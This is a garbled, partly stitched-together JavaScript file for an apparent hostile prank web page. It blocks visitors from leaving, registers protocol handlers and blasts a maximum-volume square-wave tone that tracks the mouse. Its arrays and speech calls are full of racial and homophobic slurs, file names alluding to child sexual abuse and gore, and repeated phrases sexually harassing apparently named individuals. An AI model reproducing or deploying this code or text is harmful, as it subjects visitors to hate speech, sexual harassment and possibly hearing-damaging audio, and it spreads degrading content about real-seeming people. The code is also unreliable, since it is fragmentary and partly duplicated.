...
const VIDEOS = [
  'Vid1.mp4',
  'EgRhhoWoIi0.2gnVvnKgFZZZPPJpGxRKnAS9qklBp4q-xE6MOgBaEAaN6zb1UWeU6Zloet1lDdxb7Lx9GSblKRV7pkwV.mp4',
  'reddit_soyjak_1eoy77b_1.mp4',
  'hasan.mp4',
  'heman.mp4',
  'jozin.mp4',
  'nyan.mp4',
...
const FILE_DOWNLOADS = [
  ...
  'gay-cp.jpg',
  'fat-nigger-cock.jpg',
  'chippys-sis-nudes.jpg',
  'zesoa-mom-asshole.jpg',
  'gayporn.jpg',
  'chippy-cock.jpg',
  'cat-gore.jpg',
  'child-abuse-vids.png'
]

const PHRASES = [
  'chippys raped dog chippys raped dog chippys raped dog chippys raped dog chippys raped dog chippys raped dog chippys raped dog chippys raped dog ',
  'Dibidi ba didi dou dou, Di ba didi dou, Didi didldildidldidl houdihoudi dey dou',
  'fuck niggers fuck niggersfuck niggersfuck niggersfuck niggersfuck niggersfuck niggersfuck niggers!',
  ' gay nigger cp gay nigger cp gay nigger cp gay nigger cp gay nigger cp gay nigger cp!',
  ...
  'cock in chippys ass cock in chippys ass cock in chippys ass cock in chippys ass cock in chippys ass'
]
...
function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    speak('no no no no dont leave fine fuck you nigger!')
...
function registerProtocolHandlers () {
  ...
  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'faggot')
  })
}
...
function speak (phrase) {
  ...
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
        ...
        // Set up the oscillator to generate a square wave, which is harsh and annoying
        oscillatorNode.type = 'square'; // Square waves are very buzzy
        oscillatorNode.frequency.setValueAtTime(1000, audioContext.currentTime); // Start frequency at a high annoying pitch
        oscillatorNode.start();

        // Set the gain (volume) very high for maximum loudness
        gainNode.gain.setValueAtTime(1, audioContext.currentTime); // Max volume

        // Adjust the frequency and gain based on mouse movement
        document.addEventListener('mousemove', (event) => {
            const mouseX = event.clientX / window.innerWidth; // Normalize to 0-1
            const mouseY = event.clientY / window.innerHeight; // Normalize to 0-1

            // Set the frequency based on mouse position, very rapid oscillation (making it even more annoying)
            oscillatorNode.frequency.setValueAtTime(200 + mouseX * 2000, audioContext.currentTime); // Ranges from 200Hz to 2200Hz

            // Set the gain to maximum based on mouse movement to make it very loud and harsh
            gainNode.gain.setValueAtTime(1, audioContext.currentTime); // Max gain
        });
        
        // Stop the oscillator when the window is closed
...
function superLogout () {
  ...
  const SCREEN_WIDTH = window.screen.availWidth,
    ...
    VIDEOS = ["media/videos/thugshakermindcontrol.mp4", "media/videos/TuckerRevenge.mp4", "media/videos/BisexualBidenCantGetAss.mp4", "media/videos/DrakeXBisexualBiden.mp4", "media/videos/ZestFest.mp4"],
...
function confirmPageUnload() {
    window.addEventListener("beforeunload", (event => {
        speak("fuck you nigger!"), event.returnValue = !0
    }))
}
...
// Add the remaining functions as in the original code
